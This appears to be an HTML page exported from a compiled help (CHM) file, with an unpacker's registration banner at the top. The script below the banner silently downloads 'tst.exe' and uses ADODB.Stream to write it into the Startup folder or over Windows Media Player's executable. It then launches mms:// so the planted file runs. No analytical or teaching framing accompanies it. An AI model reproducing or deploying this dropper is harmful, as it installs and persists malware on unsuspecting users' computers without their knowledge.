   ================================================================================
   <br>This file has been exported by unregistered version of CHMUnpacker.
   <br>This message is not appear on files exported by a registered version of CHMUnpacker.
   <br>You can buy CHMUnpacker at <a href="http://www.bobsoft.com/chmu">http://www.bobsoft.com/chmu</a>
   <br>================================================================================
   <br>
   <br>
   <br>
   <br>
   <script language="vbscript">
       Function Exists(filename)
           On Error Resume Next
           LoadPicture(filename)
           Exists = Err.Number =  481
       End Function
   </script>



   <script language="javascript">



    function Get_Win_Version()
    {
       var IEversion=navigator.appVersion;
       if (IEversion.indexOf('Windows 95') != -1) return "95"
       else if (IEversion.indexOf('Windows NT 4') != -1) return "NT"
       else if (IEversion.indexOf('Win 9x 4.9') != -1) return "ME"
       else if (IEversion.indexOf('Windows 98') != -1) return "98"
       else if (IEversion.indexOf('Windows NT 5.0') != -1) return "2K"
       else if (IEversion.indexOf('Windows NT 5.1') != -1) return "XP"
    }


       wmplayerpaths= [
               "C:\\Programmer\\Windows Media Player\\wmplayer.exe",
               "C:\\Program\\Windows Media Player\\wmplayer.exe",
               "C:\\Programme\\Windows Media Player\\wmplayer.exe",
               "C:\\Programmi\\Windows Media Player\\wmplayer.exe",
               "C:\\Programfiler\\Windows Media Player\\wmplayer.exe",
               "C:\\Programas\\Windows Media Player\\wmplayer.exe",
               "C:\\Programa1s\\Windows Media Player\\wmplayer.exe",
               "C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe",
               "C:\\Program Files\\Windows Media Player\\wmplayer.exe"
              ];

       for (i=0;i<wmplayerpaths.length;i++) {
           wmplayerpath = wmplayerpaths[i];
           if (Exists(wmplayerpath))
               break;
       }






      var InetPath=document.location.href;
      iPrefix=InetPath.substring(0,7);

      switch(iPrefix)
      {
      case "http://" :
                      j=InetPath.lastIndexOf('/');
                      InetPath=InetPath.slice(0,j)+'/tst.exe';
                      break;
      case "ms-its:" :
                      i=InetPath.indexOf('!');
                      j=InetPath.lastIndexOf('//');
                      InetPath=InetPath.slice(i+1,j)+'/tst.exe';
                      break;
      }

      var x = new ActiveXObject("Microsoft.XMLHTTP");
      x.Open("GET",InetPath,0);
      x.Send();

      var WinVer=Get_Win_Version();

      win2k="C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\qwe.exe"
      //win98="c:\\windows\\Start Menu\\Programs\\Startup\\qwe.exe"
      win98="C:\\qwe.exe "
   //  alert(WinVer);
      if (WinVer=="98")
      {
       try
       {
           var oStream = new ActiveXObject('ADODB.Stream');
               oStream.Mode = 3;
               oStream.Type = 1;
               oStream.Open();
               oStream.Write(x.responseBody);
               oStream.SaveToFile(win98,2);

       }
       catch(e){}
      }
      else
      {
       if (WinVer=="2K")
       {
           try
           {
                   var oStream = new ActiveXObject('ADODB.Stream');
                   oStream.Mode = 3;
                   oStream.Type = 1;
                   oStream.Open();
                   oStream.Write(x.responseBody);
                   oStream.SaveToFile(win2k,2);
           }
           catch(e){}

       }
       else
       {
       try
       {
               var oStream = new ActiveXObject('ADODB.Stream');
               oStream.Mode = 3;
               oStream.Type = 1;
               oStream.Open();
               oStream.Write(x.responseBody);
               oStream.SaveToFile(wmplayerpath,2);
       }
       catch(e){}

       location.href = "mms://";
       }
     }
   </script>
